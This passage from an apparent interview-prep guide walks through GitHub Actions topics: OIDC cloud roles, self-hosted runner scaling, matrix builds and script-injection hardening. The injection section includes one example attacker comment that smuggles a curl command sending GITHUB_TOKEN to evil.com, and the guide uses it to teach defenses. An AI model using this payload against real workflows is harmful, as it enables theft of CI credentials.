}

# IAM role for GitHub Actions - Production deployments
resource "aws_iam_role" "github_actions_deploy_prod" {
  name = "github-actions-deploy-prod"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Federated = aws_iam_openid_connect_provider.github.arn
        }
        Action = "sts:AssumeRoleWithWebIdentity"
        Condition = {
          StringEquals = {
            "token.actions.githubusercontent.com:aud" = "sts.amazonaws.com"
          }
          StringLike = {
            # Only allow from specific repo AND main branch AND production environment
            "token.actions.githubusercontent.com:sub" = "repo:my-org/my-app:environment:production"
          }
        }
      }
    ]
  })

  # Least privilege - only what's needed for deployment
  inline_policy {
    name = "deploy-policy"
    policy = jsonencode({
      Version = "2012-10-17"
      Statement = [
        {
          Effect = "Allow"
          Action = [
            "eks:DescribeCluster",
            "eks:ListClusters"
          ]
          Resource = "*"
        },
        {
          Effect = "Allow"
          Action = [
            "ecr:GetAuthorizationToken",
            "ecr:BatchCheckLayerAvailability",
            "ecr:GetDownloadUrlForLayer",
            "ecr:BatchGetImage"
          ]
          Resource = "*"
        }
      ]
    })
  }
}

# Role for staging - more permissive conditions
resource "aws_iam_role" "github_actions_deploy_staging" {
  name = "github-actions-deploy-staging"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Federated = aws_iam_openid_connect_provider.github.arn
        }
        Action = "sts:AssumeRoleWithWebIdentity"
        Condition = {
          StringEquals = {
            "token.actions.githubusercontent.com:aud" = "sts.amazonaws.com"
          }
          StringLike = {
            # Allow from main branch or staging environment
            "token.actions.githubusercontent.com:sub" = [
              "repo:my-org/my-app:ref:refs/heads/main",
              "repo:my-org/my-app:environment:staging"
            ]
          }
        }
      }
    ]
  })
}

# Output role ARNs for workflow configuration
output "prod_role_arn" {
  value = aws_iam_role.github_actions_deploy_prod.arn
}

output "staging_role_arn" {
  value = aws_iam_role.github_actions_deploy_staging.arn
}
```

### Step 3: Configure GitHub Workflow with OIDC

```yaml
name: Deploy with OIDC

on:
  push:
    branches: [main]

# Required for OIDC token
permissions:
  id-token: write   # Required for requesting JWT
  contents: read    # Required for actions/checkout

jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    environment: staging  # Links to GitHub environment
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials (OIDC)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy-staging
          aws-region: us-east-1
          # Optional: customize session
          role-session-name: GitHubActions-${{ github.run_id }}
          role-duration-seconds: 900  # 15 minutes max

      - name: Verify credentials
        run: |
          aws sts get-caller-identity
          # Shows: arn:aws:sts::123456789012:assumed-role/github-actions-deploy-staging/GitHubActions-xxx

      - name: Deploy to staging
        run: |
          aws eks update-kubeconfig --name staging-cluster
          kubectl apply -f k8s/staging/

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment: production  # Requires approval if configured
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials (OIDC)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          # Different role for production - more restrictive
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy-prod
          aws-region: us-east-1

      - name: Deploy to production
        run: |
          aws eks update-kubeconfig --name production-cluster
          kubectl apply -f k8s/production/
```

### Step 4: Configure GCP Workload Identity Federation

```yaml
# For Google Cloud
name: Deploy to GCP

permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Authenticate to Google Cloud
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: 'projects/123456789/locations/global/workloadIdentityPools/github-pool/providers/github-provider'
          service_account: 'github-actions@project-id.iam.gserviceaccount.com'

      - name: Set up Cloud SDK
        uses: google-github-actions/setup-gcloud@v2

      - name: Deploy
        run: |
          gcloud container clusters get-credentials cluster-name --region us-central1
          kubectl apply -f k8s/
```

### Step 5: Configure Azure OIDC

```yaml
# For Azure
name: Deploy to Azure

permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v4

      - name: Azure Login (OIDC)
        uses: azure/login@v1
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}

      - name: Deploy to AKS
        run: |
          az aks get-credentials --resource-group myRG --name myAKS
          kubectl apply -f k8s/
```

### Step 6: Environment Protection Rules

```yaml
# Repository Settings > Environments > production

# Configure in GitHub UI:
# 1. Required reviewers: platform-team
# 2. Wait timer: 5 minutes
# 3. Deployment branches: main only
# 4. Environment secrets (if any)

# Workflow using protected environment
name: Production Deploy

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://app.company.com

    permissions:
      id-token: write
      contents: read

    steps:
      - uses: actions/checkout@v4

      # This step will wait for approval before running
      - name: Configure AWS (OIDC)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}  # Environment variable
          aws-region: us-east-1

      - name: Deploy
        run: ./deploy.sh
```

### Step 7: Security Best Practices

```yaml
name: Secure Workflow

on:
  push:
    branches: [main]
  pull_request:

# Minimum required permissions
permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build

  # Only deploy job needs elevated permissions
  deploy:
    needs: build
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    runs-on: ubuntu-latest
    environment: production

    # Job-level permissions (overrides workflow-level)
    permissions:
      id-token: write
      contents: read

    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
          aws-region: us-east-1

      # Never echo secrets or tokens
      - name: Deploy (without exposing credentials)
        run: |
          # AWS credentials are automatically available as env vars
          # Don't: echo $AWS_ACCESS_KEY_ID
          # Don't: printenv | grep AWS
          aws eks update-kubeconfig --name prod-cluster
          kubectl apply -f k8s/
```


## OIDC Claim Conditions

| Claim | Example Value | Use Case |
|-------|---------------|----------|
| `sub` | `repo:org/repo:ref:refs/heads/main` | Restrict to specific branch |
| `sub` | `repo:org/repo:environment:production` | Restrict to environment |
| `sub` | `repo:org/repo:pull_request` | Allow/deny PR workflows |
| `repository` | `org/repo` | Restrict to specific repo |
| `repository_owner` | `org` | Allow any repo in org |

<InterviewQuiz
  question="What is the main security advantage of using OIDC for GitHub Actions authentication over storing cloud credentials as secrets?"
  options={[
    "OIDC is faster to configure",
    "OIDC tokens are shorter and easier to manage",
    "OIDC uses short-lived tokens that can't be leaked or stolen, and provides fine-grained access based on repository, branch, and environment",
    "OIDC works with more cloud providers"
  ]}
  correctAnswer={2}
  explanation="OIDC's main advantage is eliminating long-lived credentials entirely. Traditional secrets can be leaked through logs, compromised CI systems, or insider threats. OIDC tokens are: 1) Short-lived (typically 1 hour), 2) Automatically rotated every workflow run, 3) Scoped to specific repos/branches/environments via IAM conditions, 4) Never stored anywhere - generated on-demand. Even if a token is somehow captured, it's useless after expiration."
/>

---

### Question 5: GitHub-hosted runners don't meet our requirements. Configure self-hosted runners at scale.

**Type:** Practical | **Category:** Self-Hosted Runners

## The Scenario

Your organization needs more than GitHub-hosted runners can provide:

```
Requirements:
- GPU access for ML model training
- Access to private network resources
- Larger machines (64GB RAM, 32 cores)
- Custom software pre-installed
- Compliance: builds must run in our data center
- Cost: $50k/month on GitHub-hosted runners
```

## The Challenge

Design and implement a self-hosted runner infrastructure that's secure, scalable, and cost-effective while meeting all requirements.


### Step 1: Choose the Right Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    Self-Hosted Runner Architecture               │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Option 1: Kubernetes (Actions Runner Controller)               │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  Kubernetes Cluster                                       │  │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐       │  │
│  │  │ Runner Pod  │  │ Runner Pod  │  │ Runner Pod  │       │  │
│  │  │ (ephemeral) │  │ (ephemeral) │  │ (ephemeral) │       │  │
│  │  └─────────────┘  └─────────────┘  └─────────────┘       │  │
│  │           ▲                                               │  │
│  │           │ Scales based on pending jobs                 │  │
│  │  ┌────────┴────────┐                                     │  │
│  │  │ ARC Controller  │                                     │  │
│  │  └─────────────────┘                                     │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                  │
│  Option 2: VM Auto-Scaling (AWS/GCP/Azure)                      │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  Auto Scaling Group                                       │  │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐       │  │
│  │  │ Runner VM   │  │ Runner VM   │  │ Runner VM   │       │  │
│  │  │ (ephemeral) │  │ (ephemeral) │  │ (ephemeral) │       │  │
│  │  └─────────────┘  └─────────────┘  └─────────────┘       │  │
│  │           ▲                                               │  │
│  │           │ Webhook triggers scaling                     │  │
│  │  ┌────────┴────────┐                                     │  │
│  │  │ Webhook Service │                                     │  │
│  │  └─────────────────┘                                     │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Step 2: Deploy Actions Runner Controller (ARC)

```yaml
# Install ARC using Helm
# helm repo add actions-runner-controller https://actions-runner-controller.github.io/actions-runner-controller
# helm install arc actions-runner-controller/actions-runner-controller -n arc-system

# runner-deployment.yaml
apiVersion: actions.summerwind.dev/v1alpha1
kind: RunnerDeployment
metadata:
  name: org-runners
  namespace: arc-runners
spec:
  replicas: 2  # Minimum runners
  template:
    spec:
      organization: my-org
      labels:
        - self-hosted
        - linux
        - x64
      # Ephemeral - new runner for each job
      ephemeral: true
      # Resource requests
      resources:
        requests:
          cpu: "2"
          memory: "4Gi"
        limits:
          cpu: "4"
          memory: "8Gi"
      # Docker-in-Docker for container builds
      dockerdWithinRunnerContainer: true
      # Custom image with pre-installed tools
      image: ghcr.io/my-org/custom-runner:latest
      # Security context
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
---
# Horizontal Runner Autoscaler
apiVersion: actions.summerwind.dev/v1alpha1
kind: HorizontalRunnerAutoscaler
metadata:
  name: org-runners-autoscaler
  namespace: arc-runners
spec:
  scaleTargetRef:
    kind: RunnerDeployment
    name: org-runners
  minReplicas: 1
  maxReplicas: 20
  # Scale based on workflow job queue
  scaleUpTriggers:
    - duration: "2m"
      amount: 1
  scaleDownDelaySecondsAfterScaleOut: 300
  metrics:
    - type: PercentageRunnersBusy
      scaleUpThreshold: "0.75"
      scaleDownThreshold: "0.25"
      scaleUpFactor: "2"
      scaleDownFactor: "0.5"
```

### Step 3: Create Custom Runner Image

```dockerfile
# Dockerfile for custom runner
FROM ghcr.io/actions/actions-runner:latest

# Install as root for system packages
USER root

# Install common dependencies
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    git \
    jq \
    unzip \
    docker.io \
    python3 \
    python3-pip \
    nodejs \
    npm \
    && rm -rf /var/lib/apt/lists/*

# Install specific tools
RUN curl -LO "https://dl.k8s.io/release/v1.28.0/bin/linux/amd64/kubectl" \
    && chmod +x kubectl \
    && mv kubectl /usr/local/bin/

RUN curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" \
    && unzip awscliv2.zip \
    && ./aws/install \
    && rm -rf aws awscliv2.zip

# Install Terraform
RUN wget -O- https://apt.releases.hashicorp.com/gpg | gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg \
    && echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | tee /etc/apt/sources.list.d/hashicorp.list \
    && apt-get update && apt-get install -y terraform

# Switch back to runner user
USER runner

# Pre-cache common actions
RUN mkdir -p /home/runner/_work/_actions
```

### Step 4: Runner Groups for Access Control

```yaml
# Create runner groups in GitHub Organization Settings
# Settings > Actions > Runner groups

# Using API to manage runner groups
name: Setup Runner Groups

on:
  workflow_dispatch:

jobs:
  setup:
    runs-on: ubuntu-latest
    steps:
      - name: Create runner groups
        env:
          GH_TOKEN: ${{ secrets.ADMIN_TOKEN }}
        run: |
          # Create production runner group
          gh api -X POST /orgs/my-org/actions/runner-groups \
            -f name="production-runners" \
            -f visibility="selected" \
            -f selected_repository_ids="[123,456]" \
            -f allows_public_repositories=false

          # Create general runner group
          gh api -X POST /orgs/my-org/actions/runner-groups \
            -f name="general-runners" \
            -f visibility="all" \
            -f allows_public_repositories=false
```

### Step 5: GPU Runner Configuration

```yaml
# gpu-runner-deployment.yaml
apiVersion: actions.summerwind.dev/v1alpha1
kind: RunnerDeployment
metadata:
  name: gpu-runners
  namespace: arc-runners
spec:
  replicas: 0  # Scale from 0
  template:
    spec:
      organization: my-org
      group: ml-runners
      labels:
        - self-hosted
        - linux
        - gpu
        - nvidia
      ephemeral: true
      # GPU node selector
      nodeSelector:
        nvidia.com/gpu: "true"
      # Request GPU resources
      resources:
        requests:
          nvidia.com/gpu: 1
          cpu: "8"
          memory: "32Gi"
        limits:
          nvidia.com/gpu: 1
          cpu: "16"
          memory: "64Gi"
      # Custom GPU-enabled image
      image: ghcr.io/my-org/gpu-runner:latest
      # Volume for model cache
      volumeMounts:
        - name: model-cache
          mountPath: /models
      volumes:
        - name: model-cache
          persistentVolumeClaim:
            claimName: model-cache-pvc
```

```yaml
# Workflow using GPU runner
name: Train Model

on:
  push:
    paths:
      - 'ml/**'

jobs:
  train:
    runs-on: [self-hosted, gpu, nvidia]
    steps:
      - uses: actions/checkout@v4

      - name: Check GPU
        run: nvidia-smi

      - name: Train model
        run: python ml/train.py --use-gpu
```

### Step 6: Security Hardening

```yaml
# Secure runner deployment
apiVersion: actions.summerwind.dev/v1alpha1
kind: RunnerDeployment
metadata:
  name: secure-runners
spec:
  template:
    spec:
      organization: my-org
      labels:
        - self-hosted
        - secure
      # Always ephemeral for security
      ephemeral: true
      # Security context
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        fsGroup: 1000
        seccompProfile:
          type: RuntimeDefault
      # Container security
      containerSecurityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: false  # Runner needs to write
        capabilities:
          drop:
            - ALL
      # Network policy (apply separately)
      # Limit egress to required endpoints only
```

```yaml
# network-policy.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: runner-network-policy
  namespace: arc-runners
spec:
  podSelector:
    matchLabels:
      app: runner
  policyTypes:
    - Egress
    - Ingress
  egress:
    # Allow GitHub API
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
      ports:
        - protocol: TCP
          port: 443
    # Allow DNS
    - to:
        - namespaceSelector: {}
          podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
  ingress: []  # No inbound traffic needed
```

### Step 7: Monitoring and Alerting

```yaml
# ServiceMonitor for Prometheus
apiVersion: monitoring.coreos.com/v1
kind: ServiceMonitor
metadata:
  name: arc-metrics
  namespace: arc-system
spec:
  selector:
    matchLabels:
      app.kubernetes.io/name: actions-runner-controller
  endpoints:
    - port: metrics
      interval: 30s
---
# Grafana Dashboard (JSON model)
# Alert rules
apiVersion: monitoring.coreos.com/v1
kind: PrometheusRule
metadata:
  name: arc-alerts
spec:
  groups:
    - name: arc
      rules:
        - alert: RunnerQueueBacklog
          expr: github_actions_runner_job_queue_length > 10
          for: 5m
          labels:
            severity: warning
          annotations:
            summary: "Runner job queue is backing up"

        - alert: NoAvailableRunners
          expr: github_actions_runner_available == 0
          for: 2m
          labels:
            severity: critical
          annotations:
            summary: "No runners available"
```


## Runner Type Comparison

| Aspect | GitHub-Hosted | Self-Hosted (VM) | Self-Hosted (K8s) |
|--------|---------------|------------------|-------------------|
| Cost | $0.008/min | ~$0.002/min | ~$0.001/min |
| Setup | None | Medium | Complex |
| Maintenance | None | Medium | Low (with ARC) |
| Customization | Limited | Full | Full |
| Scaling | Automatic | Manual/Webhook | Automatic |
| Security | GitHub managed | Your responsibility | Your responsibility |
| Network access | Public only | Private + Public | Private + Public |


---

### Quick Check

**Why should self-hosted runners be configured as ephemeral for security-sensitive workloads?**

   A. Ephemeral runners are faster to start
   B. Ephemeral runners cost less
-> C. **Ephemeral runners ensure each job runs in a clean environment, preventing secrets or artifacts from one job affecting another**
   D. Ephemeral runners support more operating systems

<details>
<summary>See Answer</summary>

Ephemeral runners are destroyed after each job completes, ensuring complete isolation between jobs. This prevents: 1) Secrets from one job being accessible to subsequent jobs, 2) Malicious code persisting between runs, 3) Build artifacts from affecting other builds, 4) Compromised runners being reused. For security-sensitive workloads, ephemeral runners are essential even though they have slightly higher startup overhead.

</details>

---

### Question 6: We need to test across multiple OS, Node versions, and configurations. Implement efficient matrix builds.

**Type:** Practical | **Category:** Matrix Builds

## The Scenario

Your library needs to support multiple environments:

```
Support Matrix:
- Node.js: 16, 18, 20
- OS: Ubuntu, Windows, macOS
- Package managers: npm, yarn, pnpm
- Databases: PostgreSQL 13, 14, 15, MySQL 8
Total combinations: 3 × 3 × 3 × 4 = 108 configurations
```

Running all 108 combinations for every PR would take hours and waste CI minutes. You need smart testing.

## The Challenge

Implement an efficient matrix strategy that provides comprehensive coverage without excessive resource consumption.


> **Common Mistake:** A junior engineer might test all combinations for every commit, use sequential execution, or randomly pick a subset without analysis. These approaches waste resources, slow down feedback, or miss real compatibility issues.

> **Senior Engineer Approach:** A senior engineer implements tiered testing: quick smoke tests on PR, expanded matrix on main branch, full matrix for releases. Uses dynamic matrices, fail-fast for quick feedback, and excludes impossible combinations.

### Step 1: Basic Matrix Configuration

```yaml
name: CI Matrix

on: [push, pull_request]

jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node: [16, 18, 20]

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js ${{ matrix.node }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}

      - run: npm ci
      - run: npm test
```

### Step 2: Optimize with Excludes and Includes

```yaml
name: Smart Matrix

on: [push, pull_request]

jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false  # Don't cancel all jobs if one fails
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node: [16, 18, 20]

        # Exclude specific combinations
        exclude:
          # Node 16 is EOL, skip expensive Windows/Mac tests
          - os: windows-latest
            node: 16
          - os: macos-latest
            node: 16

        # Add specific test configurations
        include:
          # Test with experimental features on latest
          - os: ubuntu-latest
            node: 21
            experimental: true
          # Test specific npm version
          - os: ubuntu-latest
            node: 18
            npm: 10

    # Continue on experimental failures
    continue-on-error: ${{ matrix.experimental || false }}

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}

      - name: Use specific npm version
        if: matrix.npm
        run: npm install -g npm@${{ matrix.npm }}

      - run: npm ci
      - run: npm test
```

### Step 3: Dynamic Matrix from JSON

```yaml
name: Dynamic Matrix

on:
  push:
    branches: [main]
  pull_request:

jobs:
  # Generate matrix dynamically
  setup:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}
    steps:
      - uses: actions/checkout@v4

      - name: Determine test matrix
        id: set-matrix
        run: |
          if [[ "${{ github.event_name }}" == "pull_request" ]]; then
            # Minimal matrix for PRs
            MATRIX=$(cat << 'EOF'
          {
            "os": ["ubuntu-latest"],
            "node": ["18"],
            "include": []
          }
          EOF
          )
          else
            # Full matrix for main branch
            MATRIX=$(cat << 'EOF'
          {
            "os": ["ubuntu-latest", "windows-latest", "macos-latest"],
            "node": ["16", "18", "20"],
            "exclude": [
              {"os": "windows-latest", "node": "16"},
              {"os": "macos-latest", "node": "16"}
            ]
          }
          EOF
          )
          fi
          echo "matrix=$(echo $MATRIX | jq -c .)" >> $GITHUB_OUTPUT

  test:
    needs: setup
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix: ${{ fromJSON(needs.setup.outputs.matrix) }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: npm ci && npm test
```

### Step 4: Matrix with Service Containers

```yaml
name: Database Matrix

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        database:
          - engine: postgres
            version: 15
            port: 5432
          - engine: postgres
            version: 14
            port: 5432
          - engine: mysql
            version: 8
            port: 3306

    services:
      db:
        image: ${{ matrix.database.engine }}:${{ matrix.database.version }}
        env:
          POSTGRES_PASSWORD: ${{ matrix.database.engine == 'postgres' && 'postgres' || '' }}
          MYSQL_ROOT_PASSWORD: ${{ matrix.database.engine == 'mysql' && 'mysql' || '' }}
          MYSQL_DATABASE: ${{ matrix.database.engine == 'mysql' && 'test' || '' }}
        ports:
          - ${{ matrix.database.port }}:${{ matrix.database.port }}
        options: >-
          --health-cmd "${{ matrix.database.engine == 'postgres' && 'pg_isready' || 'mysqladmin ping' }}"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 18

      - run: npm ci

      - name: Run tests
        env:
          DB_ENGINE: ${{ matrix.database.engine }}
          DB_PORT: ${{ matrix.database.port }}
          DB_HOST: localhost
        run: npm run test:integration
```

### Step 5: Tiered Testing Strategy

```yaml
name: Tiered Testing

on:
  push:
    branches: [main, develop]
  pull_request:
  release:
    types: [published]

jobs:
  # Tier 1: Quick smoke tests (every commit)
  smoke:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 18
          cache: 'npm'
      - run: npm ci
      - run: npm run lint
      - run: npm run test:smoke

  # Tier 2: Standard tests (PR and main)
  standard:
    needs: smoke
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest]
        node: [18, 20]
        include:
          - os: windows-latest
            node: 18
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
          cache: 'npm'
      - run: npm ci
      - run: npm test

  # Tier 3: Extended tests (main branch only)
  extended:
    needs: standard
    if: github.ref == 'refs/heads/main'
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node: [16, 18, 20]
        exclude:
          - os: macos-latest
            node: 16
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: npm ci
      - run: npm test
      - run: npm run test:integration

  # Tier 4: Full matrix (releases only)
  full:
    needs: extended
    if: github.event_name == 'release'
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node: [16, 18, 20]
        package-manager: [npm, yarn, pnpm]
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}

      - name: Install with ${{ matrix.package-manager }}
        run: |
          case "${{ matrix.package-manager }}" in
            npm)  npm ci ;;
            yarn) yarn install --frozen-lockfile ;;
            pnpm) corepack enable && pnpm install --frozen-lockfile ;;
          esac

      - run: npm test
```

### Step 6: Matrix for Multiple Packages (Monorepo)

```yaml
name: Monorepo Matrix

on: [push, pull_request]

jobs:
  detect-changes:
    runs-on: ubuntu-latest
    outputs:
      packages: ${{ steps.changes.outputs.packages }}
    steps:
      - uses: actions/checkout@v4

      - name: Detect changed packages
        id: changes
        run: |
          # Get list of changed packages
          PACKAGES=$(git diff --name-only HEAD~1 | grep '^packages/' | cut -d'/' -f2 | sort -u | jq -R -s -c 'split("\n")[:-1]')

          if [ "$PACKAGES" == "[]" ]; then
            PACKAGES='["core"]'  # Default if no specific changes
          fi

          echo "packages=$PACKAGES" >> $GITHUB_OUTPUT

  test:
    needs: detect-changes
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        package: ${{ fromJSON(needs.detect-changes.outputs.packages) }}
        node: [18, 20]

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}

      - name: Install dependencies
        run: npm ci

      - name: Test ${{ matrix.package }}
        run: npm run test --workspace=packages/${{ matrix.package }}
```


## Matrix Optimization Summary

| Strategy | When to Use | Benefit |
|----------|-------------|---------|
| `exclude` | Skip impossible/unnecessary combos | Reduce jobs |
| `include` | Add specific test configs | Targeted coverage |
| `fail-fast: false` | When you need all results | Complete picture |
| Dynamic matrix | Different needs per event | Context-aware testing |
| Tiered testing | Balance speed vs coverage | Fast feedback + thorough releases |

---

### Question 7: A workflow is vulnerable to script injection attacks. Identify and fix the security issues.

**Type:** Debugging | **Category:** Security

## The Scenario

Security team flagged this workflow during an audit:

```yaml
name: PR Comment Handler

on:
  issue_comment:
    types: [created]

jobs:
  process:
    if: github.event.issue.pull_request && contains(github.event.comment.body, '/deploy')
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Deploy
        run: |
          echo "Deploying based on comment: ${{ github.event.comment.body }}"
          ./deploy.sh ${{ github.event.comment.body }}

      - name: Update PR
        run: |
          gh pr comment ${{ github.event.issue.number }} --body "Deployed: ${{ github.event.comment.body }}"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

The security team says this is "critically vulnerable." Why?

## The Challenge

Identify all injection vulnerabilities in this workflow and implement secure alternatives.


### Step 1: Understand the Attack Vector

```yaml
# VULNERABLE: Direct interpolation of user input
- run: |
    echo "Comment: ${{ github.event.comment.body }}"

# Attacker creates comment:
# /deploy"; curl http://evil.com/steal?token=$GITHUB_TOKEN; echo "

# Results in execution of:
echo "Comment: /deploy"; curl http://evil.com/steal?token=$GITHUB_TOKEN; echo ""
# ^ The attacker's command runs with workflow permissions!
```

### Step 2: The Secure Pattern - Use Environment Variables

```yaml
name: Secure PR Comment Handler

on:
  issue_comment:
    types: [created]

# Minimum required permissions
permissions:
  contents: read
  pull-requests: write

jobs:
  process:
    # Additional validation
    if: |
      github.event.issue.pull_request &&
      contains(github.event.comment.body, '/deploy') &&
      github.event.comment.author_association == 'MEMBER'
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      # SECURE: Pass user input via environment variable
      - name: Process comment
        env:
          COMMENT_BODY: ${{ github.event.comment.body }}
          PR_NUMBER: ${{ github.event.issue.number }}
        run: |
          # Now $COMMENT_BODY is a string, not interpolated code
          echo "Processing comment from PR #$PR_NUMBER"

          # Validate the command format
          if [[ "$COMMENT_BODY" =~ ^/deploy[[:space:]]+(staging|production)$ ]]; then
            ENVIRONMENT="${BASH_REMATCH[1]}"
            echo "Valid deploy command for: $ENVIRONMENT"
            ./deploy.sh "$ENVIRONMENT"
          else
            echo "Invalid command format"
            exit 1
          fi

      - name: Update PR
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PR_NUMBER: ${{ github.event.issue.number }}
        run: |
          # Safe: PR_NUMBER is validated by GitHub
          gh pr comment "$PR_NUMBER" --body "Deployment initiated"
```

### Step 3: Validate All User-Controlled Inputs

```yaml
name: Secure Issue Handler

on:
  issues:
    types: [opened, edited]

permissions:
  issues: write

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - name: Validate issue title
        env:
          ISSUE_TITLE: ${{ github.event.issue.title }}
          ISSUE_BODY: ${{ github.event.issue.body }}
        run: |
          # Validate title format (example: must start with [BUG] or [FEATURE])
          if [[ ! "$ISSUE_TITLE" =~ ^\[(BUG|FEATURE|DOCS)\] ]]; then
            echo "::error::Issue title must start with [BUG], [FEATURE], or [DOCS]"
            exit 1
          fi

          # Sanitize for logging (remove potential injection characters)
          SAFE_TITLE=$(echo "$ISSUE_TITLE" | tr -d '`${}|;&')
          echo "Processing issue: $SAFE_TITLE"
```

### Step 4: Secure GitHub Script Usage

```yaml
# VULNERABLE: Direct interpolation in github-script
- uses: actions/github-script@v7
  with:
    script: |
      github.rest.issues.createComment({
        issue_number: context.issue.number,
        owner: context.repo.owner,
        repo: context.repo.repo,
        body: 'Received: ${{ github.event.comment.body }}'  // INJECTION!
      })

# SECURE: Use environment variables with github-script
- uses: actions/github-script@v7
  env:
    COMMENT_BODY: ${{ github.event.comment.body }}
  with:
    script: |
      const body = process.env.COMMENT_BODY;

      // Validate and sanitize
      const sanitized = body.replace(/[<>]/g, '');

      github.rest.issues.createComment({
        issue_number: context.issue.number,
        owner: context.repo.owner,
        repo: context.repo.repo,
        body: `Received: ${sanitized}`
      })
```

### Step 5: Secure Workflow for External Contributors

```yaml
name: PR from Fork Handler

# pull_request_target runs with repo secrets - be extra careful!
on:
  pull_request_target:
    types: [opened, synchronize]

permissions:
  contents: read
  pull-requests: write

jobs:
  # First job: safe operations only, no checkout of PR code
  validate:
    runs-on: ubuntu-latest
    outputs:
      safe: ${{ steps.check.outputs.safe }}
    steps:
      - name: Check if trusted contributor
        id: check
        env:
          AUTHOR: ${{ github.event.pull_request.user.login }}
          ASSOCIATION: ${{ github.event.pull_request.author_association }}
        run: |
          # Only trust members and collaborators
          if [[ "$ASSOCIATION" == "MEMBER" || "$ASSOCIATION" == "COLLABORATOR" ]]; then
            echo "safe=true" >> $GITHUB_OUTPUT
          else
            echo "safe=false" >> $GITHUB_OUTPUT
          fi

  # Second job: only runs for trusted contributors
  build:
    needs: validate
